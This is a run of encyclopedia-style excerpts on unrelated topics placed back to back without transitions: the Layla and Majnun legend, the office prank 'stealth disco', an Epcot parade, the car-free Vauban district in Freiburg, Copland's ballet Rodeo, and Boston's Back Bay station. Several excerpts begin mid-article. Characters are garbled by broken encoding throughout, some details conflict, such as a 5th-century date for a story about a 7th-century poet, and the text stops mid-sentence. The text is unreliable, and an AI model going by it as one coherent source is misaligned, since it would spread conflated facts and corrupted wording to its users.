Layla and Majnun meet for the last time before their deaths. Both have fainted and Majnun's elderly messenger attempts to revive Layla while wild animals protect the pair from unwelcome intruders. Late 16th-century illustration. Majnun Layla ( , 'Layla's Mad Lover'; ) is an old story of Arabic origin, about the 7th-century Najdi Bedouin poet Qays ibn al-Mullawah and his ladylove Layla bint Mahdi (or Layla al-Aamiriya). \\"The Layla-Majnun theme passed from Arabic to Persian, Turkish, and Indian languages\\", most famously through the narrative poem composed in 584/1188 by the Persian poet Nizami Ganjavi, as the third part of his Khamsa. It is a popular poem praising their love story.al- hakawati.net/arabic/Civilizations/diwanindex2a4.pdfhttp://www.visions.az/en/news/271/a3e8bd5c/ Lord Byron called it \\"the Romeo and Juliet of the East.\\" Qays and Layla fall in love with each other when they are young, but when they grow up Layla's father doesn't allow them to be together. Qays becomes obsessed with her, and his tribe Banu 'Amir and the community gives him the epithet of Majn≈´n ( \\"crazy\\", lit. \\"possessed by Jinn\\"). Long before Nizami, the legend circulated in anecdotal forms in Iranian akhbar. The early anecdotes and oral reports about Majnun are documented in Kitab al-Aghani and Ibn Qutaybah's Al-Shi'r wa- l-Shu'ara'. The anecdotes are mostly very short, only loosely connected, and show little or no plot development. Nizami collected both secular and mystical sources about Majnun and portrayed a vivid picture of the famous lovers.Layli and Majnun: Love, Madness and Mystic Longing, Dr. Ali Asghar Seyed-Gohrab, Brill Studies in Middle Eastern literature, Jun 2003, . excerpt:Although Majnun was to some extent a popular figure before Nizami‚Äôs time, his popularity increased dramatically after the appearance of Nizami‚Äôs romance. By collecting information from both secular and mystical sources about Majnun, Nizami portrayed such a vivid picture of this legendary lover that all subsequent poets were inspired by him, many of them imitated him and wrote their own versions of the romance. As we shall see in the following chapters, the poet uses various characteristics deriving from ‚ÄòUdhrite love poetry and weaves them into his own Persian culture>. In other words, Nizami Persianises the poem by adding several techniques borrowed from the Persian epic tradition, such as the portrayal of characters, the relationship between characters, description of time and setting, etc. Subsequently, many other Persian poets imitated him and wrote their own versions of the romance. Nizami drew influence from Udhrite love poetry, which is characterized by erotic abandon and attraction to the beloved, often by means of an unfulfillable longing. Many imitations have been contrived of Nizami's work, several of which are original literary works in their own right, including Amir Khusrow Dehlavi's Majnun o Leyli (completed in 1299), and Jami's version, completed in 1484, amounts to 3,860 couplets. Other notable reworkings are by Maktabi Shirazi, Hatefi (d. 1520), and Fuz√ªl√Æ (d.1556), which became popular in Ottoman Turkey and India. Sir William Jones published Hatefi's romance in Calcutta in 1788. The popularity of the romance following Nizami's version is also evident from the references to it in lyrical poetry and mystical mathnavis‚Äîbefore the appearance of Nizami's romance, there are just some allusions to Layla and Majnun in divans. The number and variety of anecdotes about the lovers also increased considerably from the twelfth century onwards. Mystics contrived many stories about Majnun to illustrate technical mystical concepts such as fanaa (annihilation), divƒÅnagi (love-madness), self- sacrifice, etc. Nizami's work has been translated into many languages. Arabic- language adaptations of the story include Shawqi's play The Mad Lover of Layla. Story A Mughal miniature of Amir Khusro's version; Walters Art Museum Qays ibn al-Mullawah fell in love with Layla al-Aamiriya. He soon began composing poems about his love for her, mentioning her name often. His unselfconscious efforts to woo the girl caused some locals to call him \\"Majnun.\\" When he asked for her hand in marriage, her father refused because it would be a scandal for Layla to marry someone considered mentally unbalanced. Soon after, Layla was married to another noble and rich merchant belonging to the Thaqif tribe in Ta'if. He was described as a handsome man with reddish complexion whose name was Ward Althaqafi. The Arabs called him Ward, meaning \\"rose\\" in Arabic. When Majnun heard of her marriage, he fled the tribal camp and began wandering the surrounding desert. His family eventually gave up hope for his return and left food for him in the wilderness. He could sometimes be seen reciting poetry to himself or writing in the sand with a stick. Layla is generally depicted as having moved to a place in Northern Arabia with her husband, where she became ill and eventually died. In some versions, Layla dies of heartbreak from not being able to see her would-be lover. Majnun was later found dead in the wilderness in 688 AD, near Layla's grave. He had carved three verses of poetry on a rock near the grave, which are the last three verses attributed to him. Many other minor incidents happened between his madness and his death. Most of his recorded poetry was composed before his descent into madness. It is a tragic story of undying love much like the later Romeo and Juliet. This type of love is known as \\"virgin love\\" because the lovers never marry or consummate their passion. Other famous virgin love stories set in Arabia are the stories of Qays and Lubna, Kuthair and Azza, Marwa and Al Majnoun Al Faransi, and Antara and Abla. This literary motif is common throughout the world, notably in the Muslim literature of South Asia, such as Urdu ghazals. History and influence =Persian adaptation and Persian literature= Majnun in the wilderness The story of Layla and Majnun was known in Persia as early as the 9th century. Two well known Persian poets, Rudaki and Baba Taher, both mention the lovers.‚Ä¢Zanjani, Barat. \\"Layla va Majnun-I Nizami Ganjavi: matn-I Ilmi va intiqadi az ru-yi qadimtari nuskha-hayi khatti-I qarn-I hashtum ba zikr-i ikhtilaf-i nusakh va ma‚Äôani lughat va tarikbat va kashf al-bayat\\", Tehran, Mu‚Äôassasah-I Chap va Intisharat-I Danishgah Tehran, 1369[1990] Rudaki: ŸÖÿ¥Ÿàÿ¥ ÿßÿ≥ÿ™ ÿØŸÑŸÖ ÿßÿ≤ ⁄©ÿ±ÿ¥ŸÖŸá€å ÿ≥ŸÑŸÖ€å ⁄ÜŸÜÿßŸÜ ⁄©Ÿá ÿÆÿßÿ∑ÿ±Ÿá €å ŸÖÿ¨ŸÜŸàŸÜ ÿ≤ ÿ∑ÿ±Ÿá €å ŸÑ€åŸÑ€åA. A. Seyed-Gohrab, \\"LEYLI O MAJNUN\\" in Encyclopedia Iranica Although the story was known in Arabic literature in the 5th century, it was the Persian masterpiece of Nizami Ganjavi that popularized it dramatically in Persian literature. Nizami collected both secular and mystical sources about Majnun and portrayed a vivid picture of the famous lovers. Subsequently, many other Persian poets imitated him and wrote their own versions of the romance. Nizami drew influence from Udhrite love poetry, which is characterized by erotic abandon and attraction to the beloved, often by means of an unfulfillable longing. Other influences include older Persian epics, such as VƒÅmiq u 'AdhrƒÅ, written in the 11th century, which covers a similar topic of a virgin and her passionate lover; the latter having to go through many trials to be with his love. In his adaptation, the young lovers become acquainted at school and fell desperately in love. However, they could not see each other due to a family feud, and Layla's family arranged for her to marry another man.ArtArena: \\"Layli and Madjnun in Persian Literature\\" According to Dr. Rudolf Gelpke, \\"Many later poets have imitated Nizami's work, even if they could not equal and certainly not surpass it; Persians, Turks, Indians, to name only the most important ones. The Persian scholar Hekmat has listed no less than forty Persians and thirteen Turkish versions of Layli and Majnun.\\"The Story of Layla and Majnun, by Nizami. Translated Dr. Rudolf. Gelpke in collaboration with E. Mattin and G. Hill, Omega Publications, 1966, . According to Vahid Dastgerdi, \\"If one would search all existing libraries, one would probably find more than 1000 versions of Layli and Majnun.\\" In his statistical survey of famous Persian romances, ·∏§asan ·∏éulfaqƒÅri enumerates 59 'imitations' (na·∫ìiras) of Layla and Majnun as the most popular romance in the Iranian world, followed by 51 versions of ·∏¥osrow o ≈†irin, 22 variants of Yusuf o Zuleikha and 16 versions of VƒÅmiq u  øA·∏èhrƒÅ. =Azerbaijani adaptation and Azerbaijani literature= Azerbaijani folk art based on the Layla and Majnun poem by Nizami Ganjavi. The story of Layla and Majnun passed into Azerbaijani literature.

Fuz√ªl√Æ's version was borrowed by the renowned Azerbaijani composer Uzeyir Hajibeyov, who used the material to create what became the Middle East's first opera. It premiered in Baku on 25 January 1908. The story had previously been brought to the stage in the late 19th century, when Ahmed Shawqi wrote a poetic play about the tragedy, now considered one of the best in modern Arab poetry.

Other influences Layla visits Majnun in the wilderness; Indian watercolour held by the Bodleian Library The enduring popularity of the legend has influenced Middle Eastern literature, especially Sufi writers, in whose literature the name Layla refers to their concept of the Beloved. The original story is featured in Bah√°'u'll√°h's mystical writings, the Seven Valleys. In Arabic language, Layla name means \\"night,\\" and is thought to mean \\"one who works by night\\" or \\"worker of the dark.\\" This is an apparent allusion to the fact that the romance of the star- crossed lovers was hidden and kept secret. In the Arabic language, the word Majnun means \\"a crazy person.\\" In addition to this creative use of language, the tale has also made at least one linguistic contribution, inspiring a Turkish colloquialism: to \\"feel like Mecnun\\" is to feel completely possessed, as might be expected of a person who is literally madly in love. This epic poem was translated into English by Isaac D'Israeli in the early 19th century allowing a wider audience to appreciate it. Layla has also been mentioned in many works by Aleister Crowley in many of his religious texts, including The Book of Lies. In India, it is believed that Layla and Majnun found refuge in a village in Rajasthan before they died. The graves of Layla and Majnun are believed to be located in the Bijnore village near Anupgarh in the Sriganganagar district. According to rural legend there, Layla and Majnun escaped to these parts and died there. Hundreds of newlyweds and lovers from India and Pakistan, despite there being no facilities for an overnight stay, attend the two-day fair in June. Another variation on the tale tells of Layla and Majnun meeting in school. Majnun fell in love with Layla and was captivated by her. The school master would beat Majnun for paying attention to Layla instead of his school work. However, upon some sort of magic, whenever Majnun was beaten, Layla would bleed for his wounds. The families learnt of this strange magic and began to feud, preventing Layla and Majnun from seeing each other. They meet again later in their youth and Majnun wishes to marry Layla. Layla's brother, Tabrez, would not let her shame the family name by marrying Majnun. Tabrez and Majnun quarreled and, stricken with madness over Layla, Majnun murdered Tabrez. Word reached the village and Majnun was arrested. He was sentenced to be stoned to death by the villagers. Layla could not bear it and agreed to marry another man if Majnun would be kept safe from harm in exile. Her terms were accepted and Layla got married, but her heart still longed for Majnun. Hearing this, Layla's husband rode with his men into the desert to find Majnun. Upon finding him, Layla's husband challenged Majnun to the death. The instant her husband's sword pierced Majnun's heart, Layla collapsed in her home. Layla and Majnun were buried next to each other as her husband and their fathers prayed to their afterlife. Myth has it that Layla and Majnun met again in heaven, where they loved forever.

This is sometimes referred to as stealthing (or SD-ing) that person, a process which often concludes with emailing them the footage. The term, if not the activity, was invented by employees at Chicago advertising agency Cramer- Krasselt, circa 2003. After becoming the subject of its own website at stealthdisco.com in September 2003, the concept became an Internet phenomenon. History The original stealth disco page was created by employees of the Cramer-Krasselt ad agency in Chicago. Stealth disco, particularly the subgenre which involves posting the resulting videos online, was promoted by enthusiastic bloggers and other web surfers. Creating and sharing these videos began as a form of humour and a way to lighten up an office. It usually connotes a sense of bonding between stealther and stealthee. From the original Stealth Disco site: :Working in advertising means plenty of long hours so you've got to find ways to have a little fun while you're here. A sort of point of initiation to the agency, you know you've been accepted once you've been \\"stealthed.\\" However, stealthing is occasionally a means of covert revenge and provocation. The younger age-bracket of stealthers' primary targets are usually universally known childhood enemies: teachers and peers outside of the stealthers' clique. In these cases, stealthing is certainly not friendly initiation, but cruel fun at the expense of the stealthee. In December 2003, the original site was taken down after Cramer-Krasselt received a letter from Leo Stoller suggesting that their use of the word \\"stealth\\" infringed his trademark. The office manager said that Stoller's claim was without merit, but chose to forego an expensive legal battle. As of 2005, the original video (and many that followed) can still be found online. As of 2010, it was only available via public archives.

The parade had a unity and world peace theme and featured a variety of large puppets and massive rotating drum units. The puppets were designed by Michael Curry who also designed the puppets for The Lion King on Broadway and a variety of Disney theme park shows. The leader of the parade was the Sage of Time, who was represented as a stilt walker in an elaborate costume featuring alchemy symbols, gold trim on a white robe, a staff, and a headpiece resembling a sun with a face. The Puppets included: * Reverse Marionette, a large multicolored puppet with a little marionette being held in its arms. * Disc Man, a large character with discs within the body and dreadlocks. This was the heaviest and tallest of all the puppets. * Hammer Man, a humanoid character made of pieces of sheet metal. * The Sprite, a winged character with a three tiered tail. * Angel Girl, a feminine figure with a massive wingspan and human face. * Wiggle Girl, similar to Angel Girl, but had a smaller wingspan and lacked a face, also had movement in the hips. * Bird Man, with a large wingspan and a crane- like face. This puppet was the hardest to control. * Aztec Man, with an Aztec- style head, small wingspan and several flaps at its end, similar to kite tails. The parade (or a variant of this) was also the theme for the halftime show at Super Bowl XXXIV in 2000. Both the parade and the halftime show were directed by Gary Paben. Footage of the parade could still be seen on the Earth Globe in IllumiNations: Reflections of Earth through that show's closure in 2019. Tapestry of Dreams In 2001, the parade became Tapestry of Dreams. Wishes from children around the world were heard throughout the parade's soundtrack. The middle of the parade had a tribute to Walt Disney, \\"...the greatest and most wonderful dreamer of all!\\". In this version, the Sage of Time was replaced with the Dreamseekers, a trio of elf-like humanoid characters that would open and close the parade and collect Dreamtale coins that children would receive at the Epcot Kidcot stations. These three included: * Leonardo Columbus, who represented discovery, invention and genius. * Elfin, who represented nature, magic and emotions. * Cosmo, who represented space and the unknown. It ran nightly, although in a reduced fashion compared to Tapestry of Nations and was canceled in March 2003 as a result of degrading show elements over the course of the show's lifespan. Variations Besides the Tapestry of Dreams version, there were three variations of Tapestry of Nations, each having differences in audio. The original version, with a much more serious sounding Sage of Time, ran from the parade's debut in October 1999 to the middle of December 1999. The narration was changed as to give the Sage a more gentle tone in his voice, this version running to the Millennium Celebration's conclusion in the spring of 2001. After this, changes to the script brought in the theme of human dreams, which would carry on to the Tapestry of Dreams version, though still retaining the character of the Sage of Time. This version ran to the middle of the summer of 2001 when the Tapestry of Dreams version finally debuted. Outside of Epcot, Tapestry of Nations served as the theme of the Super Bowl XXXIV halftime show and featured a massive sized Sage of Time as a backdrop in addition to an appearance by the parade's walkaround version. Soundtrack The music for the parade was written by Gavin Greenaway, who was suggested to Disney by Hans Zimmer. Regarding the lyrics, Greenaway said: > The words are made up to sound like a language, as I didn‚Äôt want to have > some people understanding and others not. So, this way, nobody understands > the words! But I chose the sounds and syllables to sound like some sort of > proto-language. Very simple vowels and limited consonants. Each listener can > attach their own meaning. For Epcot's twenty-fifth anniversary celebration on October 1, 2007, a special fireworks finale to Illuminations was set to the Tapestry of Nations and the Tapestry of Dreams soundtrack.

Construction began in 1998, and the first two residents arrived in 2001.

It is the first housing community worldwide in which all the homes produce a positive energy balance. The solar energy surplus is then sold back into the city's grid for a profit on every home.Rolf Disch Solararchitektur Transport Within Vauban, transport is primarily by foot or bicycle. The development is connected to Freiburg city centre by a tramway and is laid out linearly along the tracks, such that all homes are within easy walking distance from a tram stop. As of 2009, around 70% of the households had chosen to live without a private car. The level of car ownership has fallen over time. Both this and an earlier studyScheurer, J., 2001. Urban Ecology, Innovations in Housing Policy and the Future of Cities: Towards Sustainability in Neighbourhood Communities. PhD edn. Perth: Murdoch University Institute of Sustainable Transport. found that cycling was the main mode of transport for most trips and most activities, including commuting and shopping. A diagrammatic depiction of the transportation network in Vauban. It shows the departure from the traditional simple grid and the adoption of a complex combination grid. The drawing shows the three types of connectors: roads in red, local streets in orange and pedestrian bicycle paths in green The preference for walking and cycling can be partly attributed to the layout of the district. Building on previous experience, the plan departs from the simple inherited grid and creates a network, which incorporates the principle of ‚Äúfiltered permeability‚Äù. It means that the network geometry favours the active modes of transport and, selectively, ‚Äúfilters out‚Äù the car. This is accomplished by reducing the number of streets that run through the neighbourhood. Instead, most local streets are crescents and cul-de-sacs (see drawing). While they are discontinuous for cars, they connect to a network of pedestrian and bike paths, which permeate the entire neighbourhood. In addition, these paths go through or past open spaces, adding to the enjoyment of the trip. The logic of filtering a mode of transport is fully expressed in a new comprehensive model for laying out neighbourhoods and districts ‚Äì the Fused Grid. Most of Vauban's residential streets are described as stellplatzfrei ‚Äì literally \\"free from parking spaces\\". Vehicles are allowed down these streets at walking pace to pick up and deliver but not to park, although there are some infractions as the system depends essentially on social consensus ‚Äì there are few official controls. Each year, households are required to sign a declaration stating either that they do not own a car, or that they do, in which case they must buy a space in one of the multi-storey car parks on the periphery, at a one-off cost of ‚Ç¨17,500 plus a monthly service fee (in 2006). The citywide car sharing club has the greatest concentration of its 2,500 members in Vauban ‚Äì at least ten of its cars are stationed around the district.Melia, S., 2006.

University of the West of England.] History  The site was originally developed as a military base in 1936 and was taken over after World War II by the French forces occupying the region. The military left in 1992. Over a period of some years the vacant structures were occupied by various tribes of hippies and anarchists. Following battles with the city government, squatters won the rights to four of the original twenty barracks. At the same time a group called \\"Forum Vauban\\" was pressing the City Council to develop the site in an eco-friendly way. The remaining 38 hectares were acquired by Freiburg City Council, who delegated the mandatory community consultation to Forum Vauban. This collaboration between the Council and Forum Vauban led to the masterplan with its car-free concept. Most of the individual plots were sold to Baugruppen (co-housing groups) whose bids were assessed against criteria favouring families with children, older people and Freiburg residents. Some Baugruppen were formed by architects, others by prospective residents planning varying elements of self-build. Some of the other plots were sold to private developers. Another part of the site was developed for student dormitories for the University of Freiburg. Some former occupants of these structures have taken up residence in a diverse assortment of cars, vans, and retired civil service vehicles, forming what has been named Wagenplatz. More \\"alternative\\" projects have, among other things, converted old barracks at a low cost, such as S.U.S.I., a self-governing independent residential initiative that, through an alternative living concept, developed living spaces for students as well as subsidized housing. A self-governing \\"Community Centre Building 037\\" () has been established in one of the preserved barracks. Some former barracks were occupied in early 2005, as they would have been demolished. Vauban has 5,500 residents as of 2009.

Subtitled \\"The Courting at Burnt Ranch\\", the ballet consists of five sections: \\"Buckaroo Holiday\\", \\"Corral Nocturne\\", \\"Ranch House Party,\\" \\"Saturday Night Waltz\\", and \\"Hoe-Down\\". The symphonic version omits \\"Ranch House Party\\", leaving the other sections relatively intact. Genesis The original ballet was choreographed by Agnes de Mille for the Ballet Russe de Monte-Carlo, a dance company that moved to the United States during World War II. In order to compete with the rival company Ballet Theatre, the Ballet Russe commissioned de Mille out of a career of relative obscurity. The choreographer was given considerable creative control, choosing Aaron Copland as the composer after being impressed by his previous ballet, Billy the Kid. Though Copland was initially reluctant to compose \\"another Cowboy ballet,\\" De Mille persuaded him that this show would mark a significant departure from his previous work. As de Mille found herself occupied with instructing a highly international cast in the mannerisms of American cowboys, Copland recommended that Oliver Smith design the sets,Pollack, Howard (1999). Aaron Copland: The Life and Work of an Uncommon Man. New York: Henry Holt, . in what would prove to be a prescient action. De Mille herself played the lead, and the premiere at the Metropolitan Opera House on 16 October 1942 received 22 curtain calls. The other principal dancers in the cast included Frederic Franklin and Casimir Kokitch. Though de Mille herself was not entirely pleased with the premiere, it was attended by Rodgers and Hammerstein, who approached de Mille afterward to request that she choreograph their upcoming production of Oklahoma!. The ballet makes use of riding movements that de Mille devised with the assistance of Peggy van Praagh, for a recital in London by Peggy van Praagh and Hugh Laing in 1938. De Mille also made use of such vernacular forms as a square dance and a cadenza for a tap dancer. Noted among many reviews was de Mille's highly evocative choreography, described as \\"film sensibility\\" and renowned for its realism. The original production went on to lead a successful tour, though producers were hard pressed to replicate the skill with which de Mille had portrayed the lead. De Mille retained veto power over any casting of the ballet, which often sent companies to extremes in order to find a worthy Cowgirl. Meanwhile, Copland arranged the music as a symphonic suite for orchestra titled Four Dance Episodes from Rodeo, which consisted chiefly of removing \\"Ranch House Party\\" and minor adjustments to the final two sections. With the middle section removed, the composition resembled the symphonic form with an ambitious opening movement, slow movement, minuet and finale. In this form, Rodeo found even greater success, premiering at the Boston Pops in 1943.

Though many of Copland's works incorporate traditional American folk tunes, Rodeo is unique in that it leaves them quite intact in the score, with very little alteration on the part of the composer. This is likely attributable in part to De Mille's control over the work. Indeed, she had already blocked the entire show before Copland had written a single note and also transcribed several folk tunes, including \\"Old Paint\\", for Copland in addition to her blocking notes. The well-known main theme of \\"Hoe-Down\\" is based on a unique version of the American folk song \\"Bonyparte\\" or \\"Bonaparte's Retreat,\\" played by Salyersville, Kentucky fiddler William Hamilton Stepp, which was recorded in 1937 by Alan Lomax for the Library of Congress.Audio: https://www.youtube.com/watch?v=1yeQucos9-M A meticulous transcription by Ruth Crawford Seeger of that performance appeared in Lomax's 1941 book, \\"Our Singing Country\\". Many of the themes were autobiographical for De Mille. An extremely skilled dancer, the choreographer nonetheless felt awkward in the offstage world, and the Cowgirl's unwillingness to subscribe to traditional gender roles mirrors De Mille's experience. =Buckaroo Holiday= Rodeo opens with a grand fanfare, vamping until R5-6, where the woodwinds introduce the Cowgirl's theme. This quiet theme continues until the Rodeo theme begins presenting a highly rhythmic motif that evokes the trotting of horses. The lone Cowgirl seeks the affections of the Head Wrangler, who is rather taken with the more feminine Rancher's Daughter. The cowboys enter to the railroad tune of \\"Sis Joe\\", envisioned by de Mille as an event \\"like thunder,\\" which Copland obliges with heavy drums and brass. As the cowgirl seeks the attention of her quarry, she mimics the surrounding cowboys, reflected in the heavy use of the tune \\"If He'd Be a Buckaroo\\" in this section. The theme is repeated by various solo instruments before being realized in triple canon by the full orchestra. After a brief return to the quiet Cowgirl theme, the fanfare returns. \\"Sis Joe\\" reappears again, before the entire orchestra triumphantly plays \\"If He'd be a Buckaroo\\". =Corral Nocturne= The \\"Corral Nocturne\\" invokes the lovesick musings of the Cowgirl, portrayed rather lyrically by Copland's heavy use of oboe and bassoon. In writing this scene, de Mille noted that \\"She run[s] through the empty corrals intoxicated with space, her feet thudding in the stillness.\\" The Head Wrangler discovers her in the darkness, but she does not come toward him as the Rancher's Daughter would. Confused, he exits with the Rancher's Daughter. =Ranch House Party= The subsequent \\"Ranch House Party\\" (ballet only) was envisioned by de Mille as \\"Dance music inside. Night music outside.\\" Indeed, the section opens with a honky-tonk theme played on a piano, accompanied by a more thoughtful clarinet. The Cowgirl finds herself between the Champion Roper and the Wrangler, who are attracted to the Rancher's Daughter. \\"Corral Nocturne\\" is recalled at the end of this section, as the Cowgirl finds herself quite alone.Crist, Elizabeth B. (2005). Music for the Common Man. Oxford University Press, . =Saturday Night Waltz= While the \\"Texas minuet\\" of the \\"Saturday Night Waltz\\" plays de Mille's transcribed version of \\"I Ride an Old Paint\\" (also known as \\"Houlihan\\") the cowboys and their girls pair off. Expectant of a partner and finding none, the Cowgirl is alone until the Champion Roper approaches her, having failed to best the Wrangler in winning the affections of the Rancher's Daughter. Both this section and the \\"Corral Nocturne\\" feature Copland's characteristic economy of sound, where he uses solo instruments in lieu of entire sections. =Hoe-Down= Finally, the \\"Hoe- Down\\" opens by vamping the first bar of William H. Stepp's interpretation of the folk tune \\"Bonaparte's Retreat\\", which will become a major theme of the section. After a reprisal of the Rodeo theme, the theme proper begins in the strings, as the horns play a simple counterpoint. Instead of building to a climax, this section segues into \\"Miss McLeod's Reel\\", performed by various solo instruments. Copland briefly introduces the Irish theme \\"Gilderoy\\" in the clarinet and oboe. Building toward the end, Copland reintroduces \\"Bonaparte's Retreat\\" in canon, before returning to the Rodeo theme, which slows into the climactic kiss between the Cowgirl and the Roper. \\"Bonaparte's Retreat\\" is then resumed by the full orchestra, which ends the piece with a grand fanfare. Ballet and its place in the repertoire In what is considered one of the earliest examples of a truly American ballet, Rodeo combines the exuberance of a Broadway musical with the disciplines of classical ballet. Of particular note, the first scene requires men to pantomime riding and roping while dancing solo and dancing in groups (not very common for male ballet dancers), and while interacting with an awkward Cowgirl, who seeks their acceptance. The cast dresses in stylized western garb, which makes it all the more difficult to execute many of the moves. Classical ballet storylines typically involve some boy-meets-girl relationship, or at most a love triangle. But Rodeo forces an American Cowgirl to compete against an army of local girls in a quest to win the attention of the Champion Roper. The pairing and mutual attraction of the men and women in the cast appears fluid, and at times confusing to the rejected Cowgirl. Against this backdrop, the Cowgirl emotes strength, awkwardness, confidence, femininity and vulnerability, while executing rapid- fire footwork and pantomime, which mimics the bronco-busting of the men. Any comic dancer who plays the Cowgirl must succeed at being a failure, only to emerge triumphant in the end when she finally dons a dress for dance night. Regarding this nuanced role, DeMille said: \\"She acts like a boy, not to be a boy, but to be liked by the boys.\\" The American Ballet Notes for its 1950 premiere performance (Hessisches Staatstheater Wiesbaden, Germany) state: Rodeo ... is a love story of the American Southwest. The problem it deals with is perennial: how an American girl, with the odds seemingly all against her, sets out to get herself a man. The girl in this case is a cowgirl, a tomboy whose desperate efforts to become one of the ranch's cowhands create a problem for the cowboys and make her the laughingstock of womankind. As noted above, finding suitable Cowgirls to play this role was a challenge. Lucia Chase recalls that when the Ballet Theater Company had exclusive rights to stage Rodeo, Agnes DeMille urged the employment of \\"charming and talented comediennes from the Broadway musical stage\\" for the role. In the ballet world, DeMille's favorites for the role were: Dorothy Etheridge (Ballet Russe de Monte Carlo), Jenny Workman (The Ballet Theater Company), Carole Valleskey (Joffrey Ballet), Bonnie Wyckoff (Boston Ballet) and Christine Sarry (American Ballet Theatre). In the 1970s, Christine Sarry emerged as DeMille's preferred interpreter of this complex role, DeMille even preferring Sarry's version to her own. Agnes DeMille stated in her will that only Sarry was authorized to approve of dancers who could take up the role of the Cowgirl. Since Agnes DeMille's death, Sarry has coached and approved numerous dancers in the part. In the 21st century, the list includes: Tina LeBlanc (San Francisco Ballet (2006), Kristin Long (San Francisco Ballet, 2007); Xiomara Reyes (American Ballet Theater, 2006); Marian Butler (American Ballet Theater, 2006); and Erica Cornejo (American Ballet Theater, 2005). Of Ms. Cornejo, critic Jerry Hochman wrote, \\"Cornejo owns the role now\\". Up to 1979, Rodeo was staged mainly by deMille and Vernon Lusby, for many years one of her most trusted assistants on numerous projects. When illness precluded his ability to continue setting Rodeo in 1981, deMille asked Paul Sutherland, a former principal dancer with American Ballet Theatre, Joffrey Ballet, and Harkness Ballet who had danced leading roles in several of her ballets, to begin staging Rodeo. With the passing of Agnes deMille in 1993, ownership and all rights to Rodeo passed to her son, Jonathan Prude. For the next several years, several people staged the ballet. In 1999, Prude set up the deMille Committee to oversee her numerous works and assigned sole responsibility for staging Rodeo to Sutherland, including the selection of dancers, rehearsals and stage production. With the exception of a few companies to whom Agnes deMille had, years before, given the ballet in perpetuity, Sutherland has staged Rodeo over fifty times for dozens of companies and universities throughout the United States and Canada as well as in Antwerp, Belgium, and continues to do so. For a point of comparison, it has been nearly 120 years since the premiere of The Nutcracker, and more than 70 years since the premiere of Rodeo. This increasing longevity, plus the anchoring of Copland's score in American culture, suggests near-certain permanence for the ballet. In popular culture A version of the \\"Hoe-Down\\" section was recorded by 1970s progressive rock band Emerson, Lake & Palmer, on its Trilogy album. Fran√ßois Couture of AllMusic said that they yielded a crowd-pleaser with their version of \\"Hoedown\\". Another version of the \\"Hoe-Down\\" section was also later recorded by folk rock and jazz group B√©la Fleck and the Flecktones At Bob Dylan's performances during his \\"Never-Ending Tour\\", he is introduced by his stage manager reading a short biography with \\"Hoe-Down\\" playing in the background. The music was also famously used as the background theme for the \\"Beef. It's What's For Dinner\\" advertising campaign in the 1990s, and also in The Simpsons episode \\"The Seemingly Never-Ending Story\\". A close parody of it, titled \\"In Training\\" and adapted with the film's leitmotifs, was composed by James Horner for An American Tail: Fievel Goes West.Christian Clemmensen, \\"Review of An American Tail: Fievel Goes West,\\" FilmTracks.com, July, 13 1998.

It is located just south of Copley Square in Boston's Back Bay and South End neighborhoods, it serves MBTA Commuter Rail and MBTA subway routes, and also serves as a secondary Amtrak intercity rail station for Boston. The present building, designed by Kallmann McKinnell & Wood, opened in 1987. It replaced the New Haven Railroad's older Back Bay station - which opened in 1928 as a replacement for an 1899-built station - as well as the New York Central's Huntington Avenue and Trinity Place stations which had been demolished in 1964. Although South Station is Boston's primary rail hub, Back Bay maintains high traffic levels due to its location in the Back Bay neighborhood near the Prudential Center development and its access to important Northeast Corridor services. All Amtrak Acela Express and Northeast Regional trains running to and from South Station stop at Back Bay, as does the Boston section of the Lake Shore Limited. Four MBTA Commuter Rail routes - the Providence/Stoughton Line, Franklin Line, Needham Line, and Framingham/Worcester Line - also stop at Back Bay, as do the Orange Line subway and several local MBTA bus routes. It is the third-busiest MBTA Commuter Rail station (after North Station and South Station) and the sixth- busiest MBTA subway station. History Columbus Avenue station in 1898 The 1899-built Back Bay station on an early postcard The Boston and Worcester Railroad opened from downtown Boston to Newton in 1834, and to Worcester within the next several years. The Boston and Providence Railroad opened from Park Square to East Providence later that year. The two lines crossed on causeways in the Back Bay, then still used as a mill pond. Around 1880, the Boston and Albany Railroad (descendant of the B&W;) opened its Columbus Avenue station to serve new developments on the filled bay. In 1897, the New Haven Railroad (which owned the Boston and Providence and leased the Old Colony Railroad), the New York and New England Railroad, and the Boston and Albany formed the Boston Terminal Company to consolidate their four terminals into a new union station. Simultaneous with the construction of the resulting South Station in 1899, the New Haven also built its first Back Bay Station just east of Dartmouth Street to compete with the B&A;'s Columbus Avenue station. Back Bay station opened on September 19, 1899 - the same that that Providence Division trains began using South Station. The next year, the B&A; replaced Columbus Avenue station with the westbound-only Trinity Place and eastbound- only Huntington Avenue stations. The current Back Bay Station opened on May 4, 1987, as part of the Orange Line's Southwest Corridor project and was dedicated by Governor Michael Dukakis. It replaced the 1899-built and 1929-rebuilt ex-New York, New Haven and Hartford Railroad station of the same name, of which some remnants can still be found at the eastern end of the present station facilities, including a carved stone embedded in the brick wall on the east side of Columbus Avenue. The reopened station had South End as a secondary name, approved in 1985 as part of a series of station name changes. The 1987 reconstruction added a waiting area with a 9-foot bronze statue dedicated to civil rights and labor movement pioneer A. Philip Randolph. The area includes various posters with historical photographs and interview excerpts regarding Randolph's career in organizing the Brotherhood of Sleeping Car Porters and work with the Civil Rights Movement. On September 22, 2006, the MBTA began allowing free inbound travel from Back Bay to South Station. This change was to allow travel from Back Bay hotels to the Boston Convention and Exhibition Center and Logan International Airport (using the Silver Line from South Station) without the need to transfer to the Red Line. Until replaced with the CharlieCard Store at Downtown Crossing on August 13, 2012, an MBTA customer service booth for special pass users was located at Back Bay station. =Night Owl crash= In 1990, a northbound commuter train running along the Providence/Stoughton Line was involved in a collision with a northbound Night Owl train. The accident, which occurred to the west of the Back Bay station, injured 453 people, although there were no fatalities. =Air quality= Island platform at Back Bay; fumes in the air cause the halos around the ceiling lights Back Bay station has suffered from poor air quality since its opening; passengers with lung conditions have been advised to avoid the station. Much of the commuter rail infrastructure at Back Bay is covered and enclosed, and so diesel fumes cannot escape quickly to the outside air. A petition drive in 2000 gathered complaints about the then-\\"longstanding\\" issue. Studies in 2006 in 2008 showed that \\"the air was many, many times below air-quality standards\\" due to trapped diesel exhaust and soot. An earlier study showed elevated levels of carbon monoxide, formaldehyde, particulates, and oxides of nitrogen, though it noted that there is no regulated standard to meet for indoor air quality in public spaces. Though simple changes were made regarding scheduling, and checking to make sure train engines were running properly, in 2008 the MBTA claimed it lacked the financial resources to fully upgrade the ventilation system. In 2010, the MBTA announced that it had secured $3.0 million in federal stimulus money to improve the ventilation in the lobby. While MBTA spokesman Joe Pesaturo said there was no health 